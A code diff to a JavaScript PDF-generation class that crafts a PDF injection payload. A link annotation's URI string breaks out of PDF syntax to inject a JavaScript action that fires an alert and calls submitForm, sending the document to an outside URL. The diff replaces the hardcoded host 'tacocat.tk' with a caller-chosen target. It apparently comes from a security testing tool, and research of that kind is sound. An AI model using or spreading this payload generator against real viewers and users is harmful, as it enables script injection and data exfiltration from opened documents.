@@ -29,7 +29,7 @@ class PDFkit_template{
 				S: 'URI',
 				URI: PDFString.of(`/blah)>>/A<</S/JavaScript/JS(app.alert(1);
 				this.submitForm({
-				cURL: 'http://tacocat.tk',cSubmitAs: 'PDF'}))
+				cURL: '`+direction+`',cSubmitAs: 'PDF'}))
 				/Type/Action>>/F 0>>(
 			`),    }
 		})
@@ -37,13 +37,12 @@ class PDFkit_template{
 		page.node.set(PDFName.of('Annots'), pdfDoc.context.obj([linkAnnotationRef]))
 		const pdfBytes = await pdfDoc.save()
 		const fs = require('fs')
-		fs.writeFile("js-submitForm.pdf", new Buffer(pdfBytes), function(err){
+		fs.writeFile("js-submitForm.pdf", Buffer.from(pdfBytes), function(err){
 			if(err) {
 				return [out_name, -1 ];
 			}
 		});
-		console.log('done')
-		return [out_name, 1 ];
+		return [out_name, 1, direction];
 	}
 }
 
